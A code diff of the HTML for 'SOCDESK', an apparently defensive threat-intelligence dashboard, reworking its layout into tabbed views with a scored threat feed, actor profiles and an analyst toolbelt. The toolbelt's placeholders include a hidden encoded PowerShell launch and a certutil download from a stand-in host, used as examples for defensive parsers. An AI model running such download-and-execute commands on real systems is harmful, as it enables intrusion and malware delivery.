@@ -30,13 +30,14 @@
       S<svg class="cup" viewBox="0 0 10 13" shape-rendering="crispEdges" aria-hidden="true"><g class="steam"><g class="wisp w1"><rect x="1" y="0" width="1" height="1"/><rect x="0" y="1" width="1" height="1"/><rect x="1" y="2" width="1" height="1"/></g><g class="wisp w2"><rect x="4" y="0" width="1" height="1"/><rect x="3" y="1" width="1" height="1"/><rect x="4" y="2" width="1" height="1"/></g><g class="wisp w3"><rect x="7" y="0" width="1" height="1"/><rect x="6" y="1" width="1" height="1"/><rect x="7" y="2" width="1" height="1"/></g></g><g class="shell"><rect x="0" y="4" width="10" height="1"/><rect x="0" y="5" width="1" height="7"/><rect x="9" y="5" width="1" height="7"/><rect x="1" y="12" width="8" height="1"/></g><rect class="crema" x="1" y="5" width="8" height="2"/><rect class="body" x="1" y="7" width="8" height="5"/></svg>CDESK
     </a>
     <span class="tlp">TLP:CLEAR</span>
-    <nav>
-      <a href="#brief">Brief</a>
-      <a href="#operations">Operations</a>
-      <a href="#vulns">Vulnerabilities</a>
-      <a href="#health">Health</a>
-      <a href="#registry">Sources</a>
-      <a href="#toolbelt">Toolbelt</a>
+    <nav aria-label="Working surface">
+      <button data-view="feed" class="on">Feed</button>
+      <button data-view="vulns">Vulnerabilities</button>
+      <button data-view="actors">Actors</button>
+      <button data-view="health">Health</button>
+      <button data-view="sources">Sources</button>
+      <button data-view="toolbelt">Toolbelt</button>
+      <button data-view="brief" id="navBrief" hidden>Brief</button>
     </nav>
     <div id="staleChips"></div>
     <span class="live"><b></b><span id="liveCount">—</span></span>
@@ -44,7 +45,7 @@
 </header>
 
 <div class="wrap" id="top">
-  <div class="masthead">
+  <div class="masthead" id="masthead">
     <div class="mast-row">
       <!-- Display size is plain type. The pixel mug is a small-size device —
            it reads as an icon, not a letter, when blown up inside Archivo. -->
@@ -78,85 +79,83 @@
       backend, no account and no analytics.
       <button class="act" id="clearState">Clear analyst state</button></span>
     </p>
-    <div class="ticker">
-      <span class="lab">Live wire</span>
-      <div class="tick-view"><div class="tick-track" id="tickTrack"></div></div>
-    </div>
-    <div class="band" id="band">
-      <button class="on" data-cat="all">Daily intelligence<b>0</b></button>
-      <button data-cat="ransomware">Ransomware<b>0</b></button>
-      <button data-cat="vulnerability">Vulnerability<b>0</b></button>
-      <button data-cat="apt">APT<b>0</b></button>
-    </div>
   </div>
 
-  <section id="brief">
-    <div class="ghost">01</div>
-    <div class="sec-head reveal">
-      <div class="sec-title">
-        <div class="sec-kicker purple">Section 01 · AI-generated · local inference</div>
-        <h2>Daily brief</h2>
-      </div>
-      <div class="sec-desc">Written on local hardware from the last 24 hours of
-        collected intelligence. Generated <span class="mono" id="briefGenerated">—</span>.</div>
-      <div class="rule"></div>
-    </div>
-    <div class="brief-list" id="briefList"></div>
-  </section>
+  <!-- Verdict console — the product's centre of gravity. Renders full-width
+       directly beneath the search with NO scroll jump; everything else is
+       pushed down. Escape or Clear returns to browse mode. -->
+  <section id="console" class="vconsole" aria-live="polite" hidden></section>
 
-  <section id="operations">
-    <div class="ghost">02</div>
-    <div class="sec-head reveal">
+  <div class="ticker">
+    <span class="lab">Live wire</span>
+    <div class="tick-view"><div class="tick-track" id="tickTrack"></div></div>
+  </div>
+  <div class="band" id="band">
+    <button class="on" data-cat="all">Daily intelligence<b>0</b></button>
+    <button data-cat="ransomware">Ransomware<b>0</b></button>
+    <button data-cat="vulnerability">Vulnerability<b>0</b></button>
+    <button data-cat="apt">APT<b>0</b></button>
+  </div>
+
+  <main id="views">
+
+  <section id="operations" class="view active" data-view="feed">
+    <div class="sec-head">
       <div class="sec-title">
-        <div class="sec-kicker">Section 02 · 5 automated collectors</div>
-        <h2>Threat operations</h2>
+        <div class="sec-kicker">Work queue · 5 automated collectors · most relevant first</div>
+        <h2>Threat feed</h2>
       </div>
-      <div class="sec-desc">Daily cyber attack news, campaigns, APT activity,
-        malware and vulnerabilities, each traced to its source.</div>
+      <div class="sec-desc">Every item scored 0–100 from KEV, EPSS, severity and
+        recency — the queue surfaces what matters, chronology is one toggle away.</div>
       <div class="rule"></div>
     </div>
-    <div class="ops-tools reveal">
+    <div class="ops-tools">
       <div class="search2">
         <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3"/></svg>
         <input id="q2" placeholder="Filter the feed — title, summary, actor, malware, vendor" spellcheck="false" aria-label="Filter feed">
+      </div>
+      <div class="sortset" role="group" aria-label="Feed order">
+        <button class="fchip on" id="sortPriority">Priority</button>
+        <button class="fchip" id="sortNewest">Newest</button>
       </div>
       <span class="res-chip" id="resChip">—</span>
       <button class="export" id="exportBtn">Export JSON ↓</button>
       <button class="export ghostbtn" id="handoffBtn">Handoff ↗</button>
     </div>
-    <div class="filters reveal" id="filters"></div>
+    <div class="filters" id="filters"></div>
     <div class="ops-grid">
-      <div class="feed reveal">
+      <div class="feed">
         <div class="feed-h">
-          <span>Daily intelligence · <em class="plain" id="fhCat">all</em></span>
+          <span>Work queue · <em class="plain" id="fhCat">all</em></span>
           <span id="fhCount">—</span>
         </div>
         <div id="feedRows"></div>
+        <button class="showmore" id="feedMore" hidden>Load more</button>
       </div>
-      <aside class="rail reveal" id="rail" data-i="1"></aside>
+      <aside class="rail" id="rail"></aside>
     </div>
   </section>
 
-  <section id="vulns">
-    <div class="ghost">03</div>
-    <div class="sec-head reveal">
+  <section id="vulns" class="view" data-view="vulns">
+    <div class="sec-head">
       <div class="sec-title">
-        <div class="sec-kicker">Section 03 · KEV × CVSS × EPSS</div>
+        <div class="sec-kicker">KEV × CVSS × EPSS</div>
         <h2>Vulnerability triage</h2>
       </div>
       <div class="sec-desc">Actively exploited and most-likely-exploited first.
         A KEV chip means CISA has confirmed exploitation in the wild.</div>
       <div class="rule"></div>
     </div>
-    <div class="trends reveal" id="trends"></div>
-    <div class="wlbar reveal">
+    <div class="trends" id="trends"></div>
+    <div class="wlbar">
       <input id="wlInput" placeholder="Add a vendor or product to your watchlist — e.g. fortinet" aria-label="Add to watchlist">
       <div id="wlChips"></div>
       <button class="fchip" id="kevOnly">KEV only</button>
       <button class="fchip" id="wlOnly">Watchlist only</button>
       <span class="res-chip" id="cveCount">—</span>
     </div>
-    <table class="vtable reveal">
+    <div class="tscroll">
+    <table class="vtable">
       <thead id="cveHead"><tr>
         <th data-sort="cve">CVE</th><th>Severity</th>
         <th class="r" data-sort="cvss">CVSS</th><th class="r" data-sort="epss">EPSS</th>
@@ -165,14 +164,32 @@
       </tr></thead>
       <tbody id="cveRows"></tbody>
     </table>
+    </div>
     <button class="showmore" id="showMore" hidden>Show more</button>
   </section>
 
-  <section id="health">
-    <div class="ghost">04</div>
-    <div class="sec-head reveal">
+  <section id="actorsSec" class="view" data-view="actors">
+    <div class="sec-head">
       <div class="sec-title">
-        <div class="sec-kicker">Section 04 · Independently degradable</div>
+        <div class="sec-kicker">MITRE ATT&amp;CK · tracked profiles</div>
+        <h2>Actors &amp; malware</h2>
+      </div>
+      <div class="sec-desc">Every profile resolves in the verdict console —
+        techniques, aliases and associated software, traced to ATT&amp;CK.</div>
+      <div class="rule"></div>
+    </div>
+    <div class="wlbar">
+      <input id="actorFilter" placeholder="Filter profiles — name, alias, or ATT&amp;CK ID" aria-label="Filter profiles">
+      <span class="res-chip" id="actorCount">—</span>
+    </div>
+    <div class="agrid" id="actorGrid"></div>
+    <button class="showmore" id="actorMore" hidden>Load more</button>
+  </section>
+
+  <section id="health" class="view" data-view="health">
+    <div class="sec-head">
+      <div class="sec-title">
+        <div class="sec-kicker">Independently degradable</div>
         <h2>Collection health</h2>
       </div>
       <div class="sec-desc">One failing source degrades to a warning — never a
@@ -183,11 +200,10 @@
     <div class="hgrid" id="healthGrid"></div>
   </section>
 
-  <section id="registry">
-    <div class="ghost">05</div>
-    <div class="sec-head reveal">
+  <section id="registry" class="view" data-view="sources">
+    <div class="sec-head">
       <div class="sec-title">
-        <div class="sec-kicker">Section 05 · <span id="regCollectors">0</span> collectors ·
+        <div class="sec-kicker"><span id="regCollectors">0</span> collectors ·
           <span id="regReference">0</span> reference</div>
         <h2>Source registry</h2>
       </div>
@@ -195,17 +211,18 @@
         sources are reached by pivot link, never mirrored.</div>
       <div class="rule"></div>
     </div>
-    <table class="vtable reveal">
+    <div class="tscroll">
+    <table class="vtable">
       <thead><tr><th>Source</th><th>Type</th><th>Operational coverage</th><th class="r">Access</th></tr></thead>
       <tbody id="regRows"></tbody>
     </table>
+    </div>
   </section>
 
-  <section id="toolbelt">
-    <div class="ghost">06</div>
-    <div class="sec-head reveal">
+  <section id="toolbelt" class="view" data-view="toolbelt">
+    <div class="sec-head">
       <div class="sec-title">
-        <div class="sec-kicker">Section 06 · Runs entirely in your browser</div>
+        <div class="sec-kicker">Runs entirely in your browser</div>
         <h2>Analyst toolbelt</h2>
       </div>
       <div class="sec-desc">Paste artifacts straight from an alert. Nothing you
@@ -213,35 +230,50 @@
       <div class="rule"></div>
     </div>
     <div class="belt">
-      <div class="tool reveal">
+      <div class="tool">
         <div class="tool-h"><span>Defang / refang</span><button class="act" id="defangBtn">Defang</button></div>
         <textarea id="defangIn" spellcheck="false" placeholder="http://evil-updates.example/payload.exe   10.14.88.2"></textarea>
         <div class="out" id="defangOut">—</div>
       </div>
-      <div class="tool reveal" data-i="1">
+      <div class="tool">
         <div class="tool-h"><span>IOC extract</span>
           <span><button class="act" id="extractBtn">Extract</button>
           <button class="act" id="extractLookup">Lookup all ↗</button></span></div>
         <textarea id="extractIn" spellcheck="false" placeholder="Paste alert text, email headers, or a report paragraph…"></textarea>
         <div class="out" id="extractOut">—</div>
       </div>
-      <div class="tool reveal">
+      <div class="tool">
         <div class="tool-h"><span>Base64 decode · UTF-16LE aware</span><button class="act" id="b64Btn">Decode</button></div>
         <textarea id="b64In" spellcheck="false" placeholder="SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA…"></textarea>
         <div class="out" id="b64Out">—</div>
       </div>
-      <div class="tool reveal" data-i="1">
+      <div class="tool">
         <div class="tool-h"><span>PowerShell command parser</span><button class="act" id="psBtn">Parse</button></div>
         <textarea id="psIn" spellcheck="false" placeholder="powershell.exe -nop -w hidden -enc SQBFAFgA…"></textarea>
         <div class="out" id="psOut">—</div>
       </div>
-      <div class="tool reveal">
+      <div class="tool">
         <div class="tool-h"><span>LOLBin lookup</span><button class="act" id="lolbinBtn">Look up</button></div>
         <textarea id="lolbinIn" spellcheck="false" placeholder="certutil.exe -urlcache -split -f http://x/a"></textarea>
         <div class="out" id="lolbinOut">—</div>
       </div>
     </div>
   </section>
+
+  <section id="brief" class="view" data-view="brief">
+    <div class="sec-head">
+      <div class="sec-title">
+        <div class="sec-kicker purple">AI-generated · local inference</div>
+        <h2>Daily brief</h2>
+      </div>
+      <div class="sec-desc">Written on local hardware from the last 24 hours of
+        collected intelligence. Generated <span class="mono" id="briefGenerated">—</span>.</div>
+      <div class="rule"></div>
+    </div>
+    <div class="brief-list" id="briefList"></div>
+  </section>
+
+  </main>
 
   <div class="fband">
     <div>Daily news and research</div>
@@ -263,7 +295,6 @@
 <noscript><p class="caps noscript-note">SOCDESK requires JavaScript to render collected intelligence.</p></noscript>
 
 <script defer src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/gsap.min.js"></script>
-<script defer src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/ScrollTrigger.min.js"></script>
 <script defer src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/ScrambleTextPlugin.min.js"></script>
 <script defer src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/DrawSVGPlugin.min.js"></script>
 <script type="module" src="js/app.js"></script>
